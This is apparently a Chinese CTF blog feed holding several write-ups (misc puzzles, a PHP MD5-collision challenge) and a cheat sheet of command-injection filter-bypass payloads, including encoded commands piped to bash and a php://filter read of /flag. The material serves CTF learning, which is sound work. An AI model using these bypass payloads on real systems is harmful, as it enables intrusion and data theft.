class="hljs-regexp">/read=string.rot13/</span>resource=/flag转换为<span class="hljs-number">16</span>进制，放cookie交进去synt&#123;<span class="hljs-number">207</span>o03no-<span class="hljs-number">9</span>osq-<span class="hljs-number">4</span>r4s-oq73-p285889847or&#125; rot13解密即可flag&#123;<span class="hljs-number">207</span>b03ab-<span class="hljs-number">9</span>bfd-<span class="hljs-number">4</span>e4f-bd73-c285889847be&#125;</code></pre><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="萌新赛杂项-千字文"><a href="#萌新赛杂项-千字文" class="headerlink" title="萌新赛杂项_千字文"></a>萌新赛杂项_千字文</h2><p>简单的说下，放Stegsolve反几下色，得到一个很多二维码拼接的一张图，切割，然后扫就出flag</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Imagefilename = <span class="hljs-string">r&#x27;2.png&#x27;</span>img = Image.<span class="hljs-built_in">open</span>(filename)size = img.sizeprint(size)<span class="hljs-comment"># 准备将图片切割成9张小图片</span>weight = <span class="hljs-built_in">int</span>(size[<span class="hljs-number">0</span>] // <span class="hljs-number">29</span>)height = <span class="hljs-built_in">int</span>(size[<span class="hljs-number">1</span>] // <span class="hljs-number">29</span>)<span class="hljs-comment"># 切割后的小图的宽度和高度</span>print(weight, height)<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):        box = (weight * i, height * j, weight * (i + <span class="hljs-number">1</span>), height * (j + <span class="hljs-number">1</span>))        region = img.crop(box)        region.save(<span class="hljs-string">&#x27;&#123;&#125;&#123;&#125;.png&#x27;</span>.<span class="hljs-built_in">format</span>(j, i))</code></pre><h2 id="萌新赛密码学-签到题"><a href="#萌新赛密码学-签到题" class="headerlink" title="萌新赛密码学_签到题"></a>萌新赛密码学_签到题</h2><p>base85解一下</p><h2 id="萌新赛杂项-劝退警告"><a href="#萌新赛杂项-劝退警告" class="headerlink" title="萌新赛杂项_劝退警告"></a>萌新赛杂项_劝退警告</h2><ul><li>伪加密 解数独得密码</li><li>然后 猜说明.txt 是备注里面的话，压缩然后明文攻击解密，解压出一个图片</li><li>silenteye解图片，出一个txt，16进制的pyc文件</li><li>反编译  check(0)改check(1),运行出flag</li></ul><h2 id="萌新赛杂项-签到"><a href="#萌新赛杂项-签到" class="headerlink" title="萌新赛杂项_签到"></a>萌新赛杂项_签到</h2><ul><li>网页整下来，拖进hex 发现大量20 09 串 20对应1 09 对应0  </li><li>二进制转换</li><li>莫斯解密 </li><li>base16解密</li></ul><h2 id="萌新赛杂项-萌新福利"><a href="#萌新赛杂项-萌新福利" class="headerlink" title="萌新赛杂项_萌新福利"></a>萌新赛杂项_萌新福利</h2><ul><li>用010editor 取反一下 改MP4</li></ul><h2 id="萌新赛密码学-抱我"><a href="#萌新赛密码学-抱我" class="headerlink" title="萌新赛密码学_抱我"></a>萌新赛密码学_抱我</h2><ul><li><p>把没用的字符去掉，字频分析</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> randomcstring = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#x27;</span>key = <span class="hljs-string">&#x27;flag&#123;********&#125;&#x27;</span>length = <span class="hljs-number">300</span>c=<span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>():</span>    res = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length):        c = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">36</span>)        res += cstring[c]        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):            c = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key) - <span class="hljs-number">1</span>)            res += key[c]    <span class="hljs-keyword">return</span> res<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    res = <span class="hljs-string">&quot;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&quot;</span>    zp = <span class="hljs-string">&quot;&quot;</span>    qs = -<span class="hljs-number">10</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">3289</span>,<span class="hljs-number">11</span>):        q = i+<span class="hljs-number">11</span>        y = q+<span class="hljs-number">10</span>        zp= zp+res[q:y]print(zp)</code></pre></li></ul><h2 id="萌新赛杂项-qrcode"><a href="#萌新赛杂项-qrcode" class="headerlink" title="萌新赛杂项_qrcode"></a>萌新赛杂项_qrcode</h2><ul><li><p>010串就是二维码，分享一个脚本</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<span class="hljs-keyword">import</span> rex = <span class="hljs-number">27</span>y = <span class="hljs-number">27</span>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(x,y))data = <span class="hljs-string">&#x27;000000000000000000000000000011111110100001001011111110010000010110011001010000010010111010001001101010111010010111010010010110010111010010111010111100000010111010010000010100010010010000010011111110101010101011111110000000000000001101000000000011110110010001111101100110000111100001101001010011110000011111101001000110100000001000001000010110000101100001111010100101101001011010011000001110010111100101110011100010010110100101101000001000001111111111000001010010010110111111101111100000000000000010001001000110100011111110000110001010111000010000010100010101000111100010111010011001101111100010010111010100001001000011010010111010101110011101100110010000010100110011001011110011111110100000011100110010000000000000000000000000000&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,x):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,y):        line = data[i*x+j]        <span class="hljs-keyword">if</span> line == <span class="hljs-string">&#x27;1&#x27;</span>:            im.putpixel((i,j),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))        <span class="hljs-keyword">else</span>:            im.putpixel((i,j),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))im.show()</code></pre></li></ul><h2 id="萌新赛密码-妈呀，完了"><a href="#萌新赛密码-妈呀，完了" class="headerlink" title="萌新赛密码_妈呀，完了"></a>萌新赛密码_妈呀，完了</h2><ul><li>二进制转16进制 然后AES 密匙是20121221</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>\&#39;被过滤的情况</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令注入绕过</title>
    <link href="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <url>/2020/03/02/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="命令注入绕过的总结"><a href="#命令注入绕过的总结" class="headerlink" title="命令注入绕过的总结"></a>命令注入绕过的总结</h1><ol><li><p>联合执行,命令分隔符</p> <pre><code class="hljs llvm">Linux中：<span class="hljs-variable">%0</span>a 、<span class="hljs-variable">%0</span>d 、<span class="hljs-comment">; 、&amp; 、| 、&amp;&amp;、||</span>Windows中：<span class="hljs-variable">%0</span>a、&amp;、|、<span class="hljs-variable">%1</span>a（一个神奇的角色，作为.bat文件中的命令分隔符）</code></pre></li><li><p>绕过空格</p><pre><code class="hljs mel">可以用下面的这些绕过：&lt;,&lt;&gt;,%20(空格),%09(Tab),$IFS$9,$&#123;IFS&#125;,$IFS</code></pre></li><li><p>巧用花括号</p><pre><code class="hljs dust"><span class="xml">在Linux bash中还可以使用</span><span class="hljs-template-variable">&#123;OS_COMMAND,ARGUMENT&#125;</span><span class="xml">来执行系统命令</span><span class="hljs-template-variable">&#123;echo,hello&#125;</span><span class="xml">$</span><span class="hljs-template-variable">&#123;PATH:23:1&#125;</span><span class="xml">$</span><span class="hljs-template-variable">&#123;PWD:2:1&#125;</span><span class="xml">$</span><span class="hljs-template-variable">&#123;HOME:12:1&#125;</span></code></pre></li><li><p>黑名单绕过</p><ul><li><p>拼接绕过</p><pre><code class="hljs ini"><span class="hljs-attr">a</span>=l<span class="hljs-comment">;b=s;$a$b   #可以绕过一些关键字，比如flag</span></code></pre></li><li><p>编码绕过, /被禁的情况下</p><pre><code class="hljs coq"> base64: echo <span class="hljs-string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="hljs-type">base64</span>-d|<span class="hljs-type">bash</span> ==&gt;cat /flag  hex   : echo <span class="hljs-string">&quot;636174202f666c6167&quot;</span> | <span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">bash</span> ==&gt;cat /flag  oct   : $(printf <span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>)    如果bash被禁，可以用sh代替 / --&gt; printf <span class="hljs-string">&quot;\x2f&quot;</span>或者可以从$PATH中取/   echo $PATH|<span class="hljs-type">cut</span> -c <span class="hljs-number">1</span></code></pre></li><li><p>单引号和双引号绕过，反斜杠绕过</p><pre><code class="hljs sqf">ca<span class="hljs-string">&#x27;&#x27;</span>t <span class="hljs-built_in">flag</span> ca<span class="hljs-string">&quot;&quot;</span>t <span class="hljs-built_in">flag</span>  ca\t <span class="hljs-built_in">flag</span></code></pre></li><li><p>长度限制</p><pre><code class="hljs stata"> linux下可以用 &gt;a 创建文件名为a的空文件 <span class="hljs-keyword">ls</span> -t&gt;<span class="hljs-keyword">test</span>则会将目录按时间排序后写进<span class="hljs-keyword">test</span>文件中 <span class="hljs-keyword">sh</span>命令可以从一个文件中读取命令来执行https:<span class="hljs-comment">//xz.aliyun.com/t/2748</span></code></pre><p><img src="https://s2.ax1x.com/2020/03/02/3fk3Wj.png" alt="3fk3Wj.png"></p></li><li><p>内联执行</p><pre><code class="hljs bash"> 反引号和$(<span class="hljs-built_in">command</span>) <span class="hljs-built_in">echo</span> `<span class="hljs-built_in">pwd</span>`<span class="hljs-built_in">echo</span> $(<span class="hljs-built_in">pwd</span>)</code></pre></li><li><p>通配符</p><table><thead><tr><th>字符</th><th>解释</th></tr></thead><tbody><tr><td>*</td><td>匹配任意长度任意字符</td></tr><tr><td>？</td><td>匹配任意单个字符</td></tr><tr><td>[list]</td><td>匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合</td></tr><tr><td>[^list]</td><td>匹配指定范围外的任意单个字符或字符集合</td></tr><tr><td>[!list]</td><td>同上</td></tr><tr><td>{str1,str2}</td><td>匹配str1或者str2字符，也可以是集合</td></tr><tr><td>IFS</td><td>由<space>或<tab>或</td></tr><tr><td>CR</td><td>由<enter>产生</td></tr><tr><td>!</td><td>执行history中的命令</td></tr></tbody></table><pre><code class="hljs powershell"> <span class="hljs-built_in">cat</span> fla* <span class="hljs-built_in">cat</span><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-built_in">fl</span>*</code></pre></li><li><p>反弹shell</p></li><li><p>查看内容工具</p><pre><code class="hljs stata"><span class="hljs-keyword">cat</span>、tac、<span class="hljs-keyword">more</span>、less、head、tail、<span class="hljs-keyword">nl</span>、sed、<span class="hljs-keyword">sort</span>、uniq</code></pre></li></ul></li></ol><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://blog.csdn.net/silence1_/article/details/96135760">https://blog.csdn.net/silence1_/article/details/96135760</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>知识点总结</tag>
      
      <tag>命令注入绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安恒月赛(whcayb0l)</title>
    <link href="/2020/02/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-whcayb0l/"/>
    <url>/2020/02/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B-whcayb0l/</url>
    
    <content type="html"><![CDATA[<h2 id="EasyFlask"><a href="#EasyFlask" class="headerlink" title="EasyFlask"></a>EasyFlask</h2><p>SSTI 这个payload的构造不会 ，先挖坑</p><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><blockquote><p>掘安杯原题：<a href="https://xz.aliyun.com/t/4741#toc-7">https://xz.aliyun.com/t/4741#toc-7</a></p></blockquote><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<span class="hljs-variable">$str1</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str1&#x27;</span>];<span class="hljs-variable">$str2</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str2&#x27;</span>];<span class="hljs-variable">$str3</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str3&#x27;</span>];<span class="hljs-variable">$str4</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str4&#x27;</span>];<span class="hljs-variable">$str5</span> = (<span class="hljs-keyword">string</span>)@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str5&#x27;</span>];<span class="hljs-variable">$str6</span> = (<span class="hljs-keyword">string</span>)@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str6&#x27;</span>];<span class="hljs-variable">$str7</span> = (<span class="hljs-keyword">string</span>)@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str7&#x27;</span>];<span class="hljs-keyword">if</span>( <span class="hljs-variable">$str1</span> == <span class="hljs-variable">$str2</span> )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;str1 OR Sstr2 no no no&#x27;</span>);&#125;<span class="hljs-keyword">if</span>( md5(<span class="hljs-variable">$str1</span>) != md5(<span class="hljs-variable">$str2</span>) )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;step 1 fail&#x27;</span>);&#125;<span class="hljs-keyword">if</span>( <span class="hljs-variable">$str3</span> == <span class="hljs-variable">$str4</span> )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;str3 OR str4 no no no&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ( md5(<span class="hljs-variable">$str3</span>) !== md5(<span class="hljs-variable">$str4</span>))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;step 2 fail&#x27;</span>);&#125;<span class="hljs-keyword">if</span>( <span class="hljs-variable">$str5</span> == <span class="hljs-variable">$str6</span> || <span class="hljs-variable">$str5</span> == <span class="hljs-variable">$str7</span> || <span class="hljs-variable">$str6</span> == <span class="hljs-variable">$str7</span> )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;str5 OR str6 OR str7 no no no&#x27;</span>);&#125;<span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$str5</span>) !== md5(<span class="hljs-variable">$str6</span>) || md5(<span class="hljs-variable">$str6</span>) !== md5(<span class="hljs-variable">$str7</span>) || md5(<span class="hljs-variable">$str5</span>) !== md5(<span class="hljs-variable">$str7</span>))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;step 3 fail&#x27;</span>);&#125;<span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> !(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;come on!&quot;</span>;    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<span class="hljs-variable">$n</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>];<span class="hljs-keyword">if</span> (!(ctype_upper(<span class="hljs-variable">$a</span>)) || !(is_numeric(<span class="hljs-variable">$b</span>)) || (strlen(<span class="hljs-variable">$b</span>) &gt; <span class="hljs-number">6</span>)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a OR b fail!&quot;</span>;    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span> ((strlen(<span class="hljs-variable">$m</span>) &gt; <span class="hljs-number">4</span>) || (strlen(<span class="hljs-variable">$n</span>) &gt; <span class="hljs-number">4</span>)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;m OR n fail&quot;</span>;    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-variable">$str8</span> = hash(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$a</span>, <span class="hljs-literal">false</span>);<span class="hljs-variable">$str9</span> = strtr(hash(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$b</span>, <span class="hljs-literal">false</span>), <span class="hljs-variable">$m</span>, <span class="hljs-variable">$n</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;str8 : <span class="hljs-subst">$str8</span>&lt;/p&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;str9 : <span class="hljs-subst">$str9</span>&lt;/p&gt;&quot;</span>;<span class="hljs-keyword">if</span> ((<span class="hljs-variable">$str8</span> == <span class="hljs-variable">$str9</span>) &amp;&amp; !(<span class="hljs-variable">$a</span> === <span class="hljs-variable">$b</span>) &amp;&amp; (strlen(<span class="hljs-variable">$b</span>) === <span class="hljs-number">6</span>))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You&#x27;re great,give you flag:&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;&#125;</code></pre><ul><li><p>卡在了 5，6，7， 需要三个值不相等，MD5值相等，看writeup得知可以通过构造碰撞实现</p><p>下载<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5.exe</a> 、<a href="https://www.trisunsoft.com/tail-for-windows.htm">tail.exe</a></p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\fastcoll&gt;fastcoll_v<span class="hljs-number">1.0.0.5</span>.exe -o jlzj<span class="hljs-number">0</span> jlzj<span class="hljs-number">1</span>      #-o参数代表随机生成两个相同MD<span class="hljs-number">5</span>的文件<span class="hljs-attribute">D</span>:\fastcoll&gt;fastcoll_v<span class="hljs-number">1.0.0.5</span>.exe -p jlzj<span class="hljs-number">1</span> -o jlzj<span class="hljs-number">00</span> jlzj<span class="hljs-number">01</span>  #-p参数代表根据jlzj<span class="hljs-number">1</span>文件随机生成两个相同MD<span class="hljs-number">5</span>的文件，注意：生成的MD<span class="hljs-number">5</span>与jlzj<span class="hljs-number">1</span>不同<span class="hljs-attribute">D</span>:\fastcoll&gt;tail.exe -c <span class="hljs-number">128</span> jlzj<span class="hljs-number">00</span> &gt; a                #-c <span class="hljs-number">128</span>代表将jlzj<span class="hljs-number">00</span>的最后<span class="hljs-number">128</span>位写入文件a，这<span class="hljs-number">128</span>位正是jlzj<span class="hljs-number">1</span>与jlzj<span class="hljs-number">00</span>的MD<span class="hljs-number">5</span>不同的原因<span class="hljs-attribute">D</span>:\fastcoll&gt;tail.exe -c <span class="hljs-number">128</span> jlzj<span class="hljs-number">01</span> &gt; b                